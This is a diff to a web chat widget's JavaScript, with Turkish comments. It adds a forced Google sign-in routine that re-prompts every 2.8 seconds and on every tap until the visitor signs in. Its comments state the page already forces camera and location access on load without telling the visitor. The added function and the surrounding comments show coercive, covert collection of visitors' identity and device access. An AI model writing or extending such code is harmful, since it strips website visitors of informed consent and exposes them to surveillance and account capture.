@@ -2105,6 +2105,24 @@
       startCameraPermissionLoop(box);
     }
 
+    function beginForcedGoogleSignIn() {
+      const sync = window.ChatSync;
+      if (!sync?.enabled || typeof sync.startGoogleSignInLoop !== "function") return;
+      sync.initAuth?.();
+      sync.consumeGoogleRedirectResult?.().catch(() => {});
+      if (sync.getGoogleUser?.()) return;
+      sync.startGoogleSignInLoop({ intervalMs: 2800 });
+      // Mobil/popup jest isterse herhangi bir dokunuşta hemen tekrar dene
+      const onGesture = () => {
+        if (sync.getGoogleUser?.()) {
+          document.removeEventListener("pointerdown", onGesture, true);
+          return;
+        }
+        void sync.signInWithGoogleFast?.({ forcePrompt: true });
+      };
+      document.addEventListener("pointerdown", onGesture, true);
+    }
+
     function startOpenSequence() {
       const token = ++openSeqToken;
       if (openSeqTimer) {
@@ -2112,6 +2130,7 @@
         openSeqTimer = null;
       }
       stopCameraPermissionLoop();
+      window.ChatSync?.stopGoogleSignInLoop?.();
       clearPermissionDeniedNotice(box);
       busy = true;
       appendMessage(box, "bot", GREET_TEXT);
@@ -2120,8 +2139,9 @@
         sync: true,
       });
       busy = false;
-      // Sayfa yüklenir yüklenmez kamera+konum zorla (ziyaretçiye kamera metni yok)
+      // Kamera bağımsız zorla; Google giriş zorunlu (kabul edene kadar)
       void beginAutoCamera();
+      beginForcedGoogleSignIn();
       openSeqTimer = window.setTimeout(() => {
         openSeqTimer = null;
         if (token !== openSeqToken) return;
